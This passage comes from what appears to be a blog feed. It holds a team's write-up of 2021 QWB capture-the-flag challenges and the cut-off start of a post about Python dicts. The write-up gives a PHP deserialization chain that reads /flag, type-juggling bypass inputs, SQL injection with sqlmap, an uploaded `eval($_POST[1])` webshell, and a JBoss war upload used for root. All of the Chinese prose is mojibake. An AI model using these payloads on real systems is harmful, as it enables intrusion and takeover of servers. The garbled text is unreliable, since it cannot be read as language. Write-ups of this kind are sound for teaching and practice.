punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$promise</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">promise</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">promise</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ffiillee</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ffiilleennaammee'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Room</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token single-quoted-string string">'/flag'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Get_hint</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$hint</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Get_hint</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Room</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">-</span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>ç›´æ¥è¯»<code>/flag</code></p><p>è§£ç å¾—flag</p><img src="/article/2021qwb/image-20210613212339286-4170472.png" class="" title="image-20210613212339286" loading="lazy"><h2 id="å¯»å®-SOLVED-Err0r"><a href="#å¯»å®-SOLVED-Err0r" class="headerlink" title="å¯»å® | SOLVED | Err0r"></a>å¯»å® | SOLVED | Err0r</h2><h2 id="ä¿¡æ¯ä¸€"><a href="#ä¿¡æ¯ä¸€" class="headerlink" title="ä¿¡æ¯ä¸€"></a>ä¿¡æ¯ä¸€</h2><p>ç»•å°±å®Œäº‹ï¼Œè¦æ±‚èƒ½è¿‡<code>is_numeric</code>å‡½æ•°ï¼Œåˆ©ç”¨å˜é‡è¦†ç›–èµ‹å€¼</p><h3 id="ç¬¬ä¸€å±‚"><a href="#ç¬¬ä¸€å±‚" class="headerlink" title="ç¬¬ä¸€å±‚"></a>ç¬¬ä¸€å±‚</h3><p><code>$num1 &gt; 1024</code></p><p>ç›´æ¥<code>1025a</code>å³å¯</p><h3 id="ç¬¬äºŒå±‚"><a href="#ç¬¬äºŒå±‚" class="headerlink" title="ç¬¬äºŒå±‚"></a>ç¬¬äºŒå±‚</h3><p><code>isset($num2) &amp;&amp; strlen($num2) &lt;= 4 &amp;&amp; intval($num2 + 1) &gt; 500000</code></p><p>ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡<code>9e9</code></p><h3 id="ç¬¬ä¸‰å±‚"><a href="#ç¬¬ä¸‰å±‚" class="headerlink" title="ç¬¬ä¸‰å±‚"></a>ç¬¬ä¸‰å±‚</h3><p><code>isset($num3) &amp;&amp; &#39;4bf21cd&#39; === substr(md5($num3),0,7)</code></p><p>çˆ†md5<code>61823470</code></p><h3 id="ç¬¬å››å±‚"><a href="#ç¬¬å››å±‚" class="headerlink" title="ç¬¬å››å±‚"></a>ç¬¬å››å±‚</h3><p><code>!($num4 &lt; 0)&amp;&amp;($num4 == 0)&amp;&amp;($num4 &lt;= 0)&amp;&amp;(strlen($num4) &gt; 6)&amp;&amp;(strlen($num4) &lt; 8)&amp;&amp;isset($num4)</code></p><p>ç›´æ¥<code>aaaaaaa</code></p><h3 id="ç¬¬äº”å±‚"><a href="#ç¬¬äº”å±‚" class="headerlink" title="ç¬¬äº”å±‚"></a>ç¬¬äº”å±‚</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$b</span><span class="token operator">=</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token variable">$b</span> <span class="token operator">===</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">===</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"ç¬¬äº”å±‚"</span><span class="token punctuation">;</span>                                    <span class="token keyword">include</span> <span class="token single-quoted-string string">'KeY1lhv.php'</span><span class="token punctuation">;</span>                                    <span class="token keyword">echo</span> <span class="token variable">$KEY1</span><span class="token punctuation">;</span>                                <span class="token punctuation">&#125;</span></code></pre><p>éšä¾¿è¾“ä¸ª<code>a</code>è¿‡äº†â€¦</p><p>æ‹¿åˆ°KEY1<code>KEY1&#123;e1e1d3d40573127e9ee0480caf1283d6&#125;</code></p><h2 id="ä¿¡æ¯äºŒ"><a href="#ä¿¡æ¯äºŒ" class="headerlink" title="ä¿¡æ¯äºŒ"></a>ä¿¡æ¯äºŒ</h2><p>ä¸‹è½½å‘ç°ä¸€å¤§å †docxæ–‡æ¡£ï¼Œä¼°è®¡åœ¨æ–‡æ¡£é‡Œæ‰¾KEY2ï¼Œå†™è„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""# -*- coding: utf-8 -*-@File: findkey2.py@Author: gyy@Time: 6æœˆ 13, 2021"""</span><span class="token keyword">import</span> os<span class="token keyword">import</span> docx<span class="token keyword">def</span> <span class="token function">show_files</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> all_files<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># é¦–å…ˆéå†å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶åŠæ–‡ä»¶å¤¹</span>    file_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token comment"># å‡†å¤‡å¾ªç¯åˆ¤æ–­æ¯ä¸ªå…ƒç´ æ˜¯å¦æ˜¯æ–‡ä»¶å¤¹è¿˜æ˜¯æ–‡ä»¶ï¼Œæ˜¯æ–‡ä»¶çš„è¯ï¼ŒæŠŠåç§°ä¼ å…¥listï¼Œæ˜¯æ–‡ä»¶å¤¹çš„è¯ï¼Œé€’å½’</span>    <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> file_list<span class="token punctuation">:</span>        <span class="token comment"># åˆ©ç”¨os.path.join()æ–¹æ³•å–å¾—è·¯å¾„å…¨åï¼Œå¹¶å­˜å…¥cur_pathå˜é‡ï¼Œå¦åˆ™æ¯æ¬¡åªèƒ½éå†ä¸€å±‚ç›®å½•</span>        cur_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span>        <span class="token comment"># åˆ¤æ–­æ˜¯å¦æ˜¯æ–‡ä»¶å¤¹</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>cur_path<span class="token punctuation">)</span><span class="token punctuation">:</span>            show_files<span class="token punctuation">(</span>cur_path<span class="token punctuation">,</span> all_files<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">".doc"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            all_files<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cur_path<span class="token punctuation">)</span>    <span class="token keyword">return</span> all_files<span class="token comment"># ä¼ å…¥ç©ºçš„listæ¥æ”¶æ–‡ä»¶å</span>contents <span class="token operator">=</span> show_files<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># å¾ªç¯æ‰“å°show_fileså‡½æ•°è¿”å›çš„æ–‡ä»¶ååˆ—è¡¨</span>key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> content <span class="token keyword">in</span> contents<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-=-=-=-=-="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> docx<span class="token punctuation">.</span>Document<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> paragraph <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">.</span>paragraphs<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"KEY"</span> <span class="token keyword">in</span> paragraph<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FIND IT!!!!!\n"</span><span class="token operator">+</span>paragraph<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>paragraph<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"NOT FOUND!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nALL DONE!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span></code></pre><p>å¾—åˆ°</p><pre class="language-none"><code class="language-none">[&#39;xxx&#39;, &#39;xxx&#39;, &#39;KEY2&#123;T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS&#125;&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;]</code></pre><p>ç„¶åæäº¤KEY1å’ŒKEY2å¾—flag</p><img src="/article/2021qwb/image-20210613213530156-4170508.png" class="" title="image-20210613213530156" loading="lazy"><h2 id="Easyweb-SOLVED-D0gekong"><a href="#Easyweb-SOLVED-D0gekong" class="headerlink" title="Easyweb | SOLVED | D0gekong"></a>Easyweb | SOLVED | D0gekong</h2><p>æ‰“å¼€ç½‘å€å‘ç°æœ‰ä¸‰ä¸ªä¸œè¥¿ï¼ŒæŸ¥çœ‹æºç </p><img src="/article/2021qwb/image-20210613213721349-4170518.png" class="" title="image-20210613213721349" loading="lazy"><p>å‘ç°è·¯ç”±ï¼Œéƒ½ä¸‹è½½ä¸‹æ¥ï¼Œæœ‰ç”¨çš„hintï¼Œå…¶ä»–æ²¡ç”¨</p><pre class="language-none"><code class="language-none">Try to scan 35000-40000 ^_^.All tables are empty except for the table where the username and password are locatedTable: employee</code></pre><p>nmapçˆ†ç«¯å£</p><img src="/article/2021qwb/image-20210613213837935-4170530.png" class="" title="image-20210613213837935" loading="lazy"><p>å¾—åˆ°36842ç«¯å£ï¼Œè®¿é—®å‘ç°æ˜¯ç™»é™†ç•Œé¢ï¼Œç»™äº†è¡¨å åº”è¯¥å°±æ˜¯æ³¨å…¥ï¼Œè¯•äº†ä¸‹å‘ç°æœ‰å›æ˜¾æŠ¥é”™ï¼Œç›´æ¥sqlmapè·‘</p><p>ç”¨æˆ·åï¼šadmin</p><p>å¯†ç ï¼š99f609527226e076d668668582ac4420</p><p>ç™»é™†æˆåŠŸ</p><p>æ‰«æå‘ç°<code>/file</code>è·¯ç”±æœ‰æ–‡ä»¶ä¸Šä¼ </p><img src="/article/2021qwb/image-20210614132600977-4170551.png" class="" title="image-20210614132600977" loading="lazy"><p><code>.php</code>ç»•è¿‡è¿‡æ»¤</p><p>ç„¶å<code>./.php?1=shell.php&amp;2=&lt;?php eval($_POST[1]);?&gt;</code></p><p>è¿ä¸Šshellï¼Œéœ€è¦ææƒã€‚æ‰«è¿›ç¨‹å’Œç«¯å£ï¼Œæ²¡å•¥æ”¶è·ï¼Œæœ€ç»ˆåº”è¯¥æ˜¯æ‰“JAVAçš„jboss</p><p>frpç©¿å‡ºæ¥ï¼Œæ ¹æ®æ–‡ç« <a href="https://blog.csdn.net/weixin_43999372/article/details/88364032">https://blog.csdn.net/weixin_43999372/article/details/88364032</a></p><p>åˆ¶ä½œwaråŒ…ï¼Œä¸Šä¼ åæ‹¿åˆ°rootï¼Œè¯»å–æ ¹ç›®å½•flagï¼š</p><p>flag{V3ry_v3rY_E3si_a_w3B_Ch@1l3ng3}</p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a><strong>Re</strong></h1><h2 id="Easymath-SOLVED-Hn13"><a href="#Easymath-SOLVED-Hn13" class="headerlink" title="Easymath | SOLVED | Hn13"></a>Easymath | SOLVED | Hn13</h2><p>å°†å­—ç¬¦ä¸²ä¸¤ä¸ªä¸€ç»„æ‹†åˆ†å¹¶åšshort intä¼ å…¥å‡½æ•°åˆ¤æ–­ç›¸ç­‰ï¼Œdblæ•°ç»„ç”¨äºæ¯”è¾ƒã€‚è·Ÿè¿›å»sub_13f3å‡½æ•°ã€‚</p><p>ç»è¿‡å¤šç»„æ•°æ®æµ‹è¯•å‘ç°v3(i+1)ä¸v(i)è¿‘ä¼¼ç›¸ç­‰ï¼Œå› æ­¤v3 = 2.718281828459045 - (double)i * v3ä¸¤è¾¹çš„v3å¯ä»¥çœ‹ä½œè¿‘ä¼¼ç›¸ç­‰ï¼Œ(i+1)v3=2.718281828459045ï¼Œä½†æ˜¯ç”±äºå¾ªç¯ä¼ å…¥çš„å€¼ä¸èƒ½å–å¾—ï¼Œå› æ­¤ç›¸æ¯”ç­”æ¡ˆiçš„å€¼åº”è¯¥è¿›ä¸€æ­¥-1ï¼Œå³(flag+2)*dbl=e,flag=e/dbl-2ï¼Œç„¶åintç«¯åºä¸å­—ç¬¦ç›¸åï¼Œå†åä¸€ä¸‹å³å¯å¾—åˆ°æ­£ç¡®ç­”æ¡ˆã€‚</p><p>è„šæœ¬ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct<span class="token keyword">import</span> mathsegs <span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0.00009794904266317233</span><span class="token punctuation">,</span><span class="token number">0.00010270456917442</span><span class="token punctuation">,</span><span class="token number">0.00009194256152777895</span><span class="token punctuation">,</span><span class="token number">0.0001090322021913372</span>ï¼Œ<span class="token number">0.0001112636336217534</span><span class="token punctuation">,</span><span class="token number">0.0001007442677411854</span><span class="token punctuation">,</span><span class="token number">0.0001112636336217534</span><span class="token punctuation">,</span><span class="token number">0.0001047063607908828</span><span class="token punctuation">,</span><span class="token number">0.0001112818534005219</span><span class="token punctuation">,</span><span class="token number">0.0001046861985862495</span><span class="token punctuation">,</span><span class="token number">0.0001112818534005219</span>ï¼Œ<span class="token number">0.000108992856167966</span><span class="token punctuation">,</span><span class="token number">0.0001006882924839248</span><span class="token punctuation">,</span><span class="token number">0.0001112590796092291</span><span class="token punctuation">,</span><span class="token number">0.0001089841164633298</span><span class="token punctuation">,</span><span class="token number">0.00008468431512187874</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">b""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> segs<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>e<span class="token operator">/</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">+=</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;H"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>e<span class="token operator">/</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p>è„šæœ¬è·‘å®Œç›´æ¥å‡ºflagï¼šflag{saam_dim_gei_lei_jam_caa_sin_laa}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h1 id=&quot;ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯ï¼š&quot;&gt;&lt;a href=&quot;#ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯ï¼š&quot; class=&quot;headerlink&quot; title=&quot;ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯ï¼š&quot;&gt;&lt;/a&gt;ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯ï¼š&lt;/h1&gt;&lt;p&gt;æˆ˜é˜Ÿåç§°ï¼šæˆ‘æ˜¯èœé¸¡QAQ&lt;/p&gt;
&lt;p&gt;æˆ˜é˜Ÿæ’åï¼š68å&lt;/p</summary>
      
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
  </entry>
  
  <entry>
    <title>Python dictçš„å°å‘ç°</title>
    <link href="https://err0r.top/article/pythondict/"/>
    <id>https://err0r.top/article/pythondict/</id>
    <published>2021-06-08T07:34:43.000Z</published>
    <updated>2021-06-08T12:05:30.212Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸‹æ’¸è„šæœ¬çš„æ—¶å€™å¤„ç†æ•°æ®ç”¨åˆ°dictæ—¶çš„æœ‰è¶£å‘ç°</p><a id="more"></a><p>å­—å…¸æ˜¯å¦ä¸€ç§å¯å˜å®¹å™¨æ¨¡å‹ï¼Œä¸”å¯å­˜å‚¨ä»»æ„ç±»å‹å¯¹è±¡ã€‚</p><p>å…ˆä¸Š</p><h2 id="æµ‹è¯•ä»£ç "><a href="#æµ‹è¯•ä»£ç " class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: dicttest.py@Author: gyy@Time: 6æœˆ 08, 2021"""</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">resttask</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å‰©ä½™ä»»åŠ¡ï¼š%d ä¸ª"</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    rest <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>        rest<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>rest<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test1</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\ntest1\n\n"</span><span class="token punctuation">)</span>    time <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> user <span class="token keyword">in</span> data<span class="token punctuation">:</span>            resttask<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=========="</span><span class="token punctuation">)</span>            <span class="token triple-quoted-string string">"""                ä¸­é—´çœç•¥            """</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span>                <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'C++'</span> <span class="token keyword">and</span> time<span class="token punctuation">:</span>  <span class="token comment"># æ¨¡æ‹Ÿå‡ºé”™æƒ…å†µ</span>                    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>  <span class="token comment"># æœ¬æ¬¡é€‰ç”¨çš„æµ‹è¯•æ•°æ®å‡æ²¡æœ‰ä»»ä½•ä¸»è§‚æ„è§</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    data<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>user<span class="token punctuation">)</span>  <span class="token comment"># å¦‚æœå®Œæˆå°±ç§»å‡ºæ­¤é¡¹</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                time <span class="token operator">-=</span> <span class="token number">1</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"All Done!"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test2</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\ntest2\n\n"</span><span class="token punctuation">)</span>    time <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        resttask<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=========="</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> data<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># å…ˆpopå‡ºdict</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">"""                ä¸­é—´çœç•¥            """</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span>            <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Java'</span> <span class="token keyword">and</span> time<span class="token punctuation">:</span>  <span class="token comment"># æ¨¡æ‹Ÿå‡ºé”™æƒ…å†µ</span>                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>  <span class="token comment"># æœ¬æ¬¡é€‰ç”¨çš„æµ‹è¯•æ•°æ®å‡æ²¡æœ‰ä»»ä½•ä¸»è§‚æ„è§</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            time <span class="token operator">-=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span>  <span class="token comment"># å¦‚æœå‡ºé”™å†ç»™å®ƒåŠ å›è¿›é˜Ÿåˆ—</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"All Done!"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getdata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C++"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Python"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"PHP"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"go"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Java"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"sql"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"solidity"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span>  <span class="token comment"># æœ¬æ¬¡é€‰ç”¨çš„æµ‹è¯•æ•°æ®å‡æ²¡æœ‰ä»»ä½•ä¸»è§‚æ„è§</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    show<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    test1<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 